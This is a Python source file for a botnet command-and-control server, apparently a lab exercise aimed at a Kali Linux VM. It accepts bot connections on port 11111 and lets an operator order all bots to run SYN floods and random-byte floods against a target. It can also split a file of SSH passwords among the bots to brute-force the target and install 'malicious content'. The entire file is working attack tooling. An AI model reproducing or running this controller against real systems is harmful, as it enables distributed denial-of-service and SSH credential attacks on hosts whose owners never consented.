#Author: Karun Sharma

import socket
import threading

TARGET = ' '#IP Address of Kali Linux target VM to be read from the config file

lock = threading.Lock()
referencestosockets = list()
exitfunction =False
with open("Config.txt", 'r') as file:
	content = file.readline()
	TARGET = content[16:]
	TARGET = TARGET.rstrip()


def connectbot(clientsocketsource):
	"""
	Receiever thread for packets
	"""
	global exitfunction
	while True:
		data = clientsocketsource.recv(4096)
		if exitfunction == True:
			return
		print("Data receieved from bot: {}".format(data))


def sendcommands():
	"""
	Sender thread for packets
	"""
	global referencestosockets
	global lock
	global exitfunction
	global s
	while True:
		print("Choose the type of command to execute ")
		print("1) SYN Flood\n 2) Install malicious content \n 3) Get status of bot \n 4) Flooding of random bytes \n 5) Exit server")
		input_get = raw_input()
		
		duration = ''
		durationofflood = ''
		if int(input_get) == 1:
			duration = raw_input("Enter the duration of the attack in seconds: ")

		if int(input_get) == 4:
			durationofflood = raw_input("Enter duration of flood in seconds")

		if int(input_get) == 2:
			passattempts = []
			templist = []
			with open("SSHPasswordsForTarget.txt", 'r') as file:
				content = file.readlines()
				numberofbots = len(referencestosockets)
				counter = 0
				for index in range(numberofbots):
					for inner in range(len(content) / numberofbots):
						line = content[counter]
						line = line.rstrip()
						templist.append(line)
						counter = counter + 1

					passattempts.append(templist)
					templist = []

			print(passattempts)

		if int(input_get) == 5:
			exitfunction = True



		lock.acquire()
		i = 0
		for row in referencestosockets:
			if int(input_get) == 1:
				command = "\t".join(("SYN FLOOD", str(duration), TARGET))
				row.send(command)

			if int(input_get) == 2:
				row.send("\t".join(("INSTALL",TARGET,' '.join(passattempts[i]))))
				i = i + 1

			if int(input_get) == 3:
				row.send("STATUS")

			if int(input_get) == 4:
				row.send("\t".join(("FLOODING",TARGET,str(durationofflood))))

			if int(input_get) == 5:
				row.send("\t".join(("EXIT",TARGET)))

		lock.release()
		i = 0

		if exitfunction == True:
			s.shutdown(socket.SHUT_WR)

			return


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(('',11111))

s.listen(300)

listofbots = list()
addresstracker = list()

commandsender = threading.Thread(target=sendcommands)
commandsender.start()

while True:
	clientsocket,address = s.accept()
	addresstracker.append(address)
	lock.acquire()
	referencestosockets.append(clientsocket)
	lock.release()
	
	print('{} is connected'.format(address))
	
	t = threading.Thread(target=connectbot,args=(clientsocket,))
	listofbots.append(t)
	t.start()


commandsender.join()
#s.shutdown(socket.SHUT_WR)
#socket.shutdown(socket.SHUT_WR)

for index in listofbots:
	index.join()

s.close()
